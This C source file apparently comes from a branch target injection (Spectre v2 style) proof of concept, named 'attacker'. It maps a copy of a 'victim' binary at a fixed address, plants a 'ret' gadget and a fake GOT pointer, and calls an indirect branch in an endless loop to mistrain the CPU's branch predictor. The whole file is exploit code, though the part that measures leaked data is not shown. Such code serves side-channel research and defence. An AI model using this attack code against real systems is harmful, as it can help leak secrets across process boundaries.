#include <emmintrin.h>
#include <err.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

char *map_at(uint64_t addr, uint64_t size, int prot) {
  char *mem = mmap((void *)addr, size, prot, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
  if (mem == MAP_FAILED) err(1, "mmap");
  if (mem != (void *)addr) errx(1, "mmap not at addr");
  return mem;
}

char *map_file(const char *path, uint64_t size) {
  int fd = open(path, O_RDONLY);
  if (fd == -1) err(1, "open");
  char *mem = mmap(0, size, PROT_READ|PROT_EXEC, MAP_PRIVATE, fd, 0);
  if (mem == MAP_FAILED) err(1, "mmap");
  return mem;
}

char *map_file_copy(const char *path, uint64_t addr, uint64_t size) {
  int fd = open(path, O_RDONLY);
  if (fd == -1) err(1, "open");
  char *tmp = mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);
  if (tmp == MAP_FAILED) err(1, "mmap");
  char *mem = map_at(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC);
  if (mem == MAP_FAILED) err(1, "mmap");
  if (mem != (void *)addr) errx(1, "mmap not at addr");
  memcpy(mem, tmp, size);
  if (munmap(tmp, size) == -1) err(1, "mprotect");
  if (close(fd) == -1) err(1, "close");
  return mem;
}

void put8(char *where, uint8_t what) { memcpy(where, &what, sizeof(what)); }
void put16(char *where, uint16_t what) { memcpy(where, &what, sizeof(what)); }
void put32(char *where, uint32_t what) { memcpy(where, &what, sizeof(what)); }
void put64(char *where, uint64_t what) { memcpy(where, &what, sizeof(what)); }
void nop(char *addr, int size) { for (int i = 0; i < size; i++) addr[i] = 0x90; }

const char binary_path[] = "./victim";
uint64_t binary_base = 0x555555554000ul;

#define PAGE_SIZE 0x1000
#define PAGE_MASK (PAGE_SIZE-1)

int main(int argc, char *argv[]) {
  if (argc != 4) errx(1, "usage: ./attacker <gadget> <victim> <target>");

  uint64_t gadget = strtoul(argv[1], NULL, 16);
  uint64_t victim = strtoul(argv[2], NULL, 16);
  uint64_t target = strtoul(argv[3], NULL, 16);

  printf("victim 0x%lx - gadget 0x%lx - target 0x%lx\n", victim, gadget, target);

  char *binary = map_file_copy(binary_path, binary_base, 0x2000);
  put64(&binary[gadget], 0xc3); // gadget: ret
  char *binary_got = map_at((binary_base + target) & ~PAGE_MASK, 0x1000, PROT_READ|PROT_WRITE);
  put64(&binary_got[0x0], binary_base + gadget); // gadget address
  put64(&binary_got[target & PAGE_MASK], (uint64_t)&binary_got[0]); // ptr to gadget

  void (*bti)() = (void (*)())&binary[victim];

  while (1) bti();

  return 0;
}
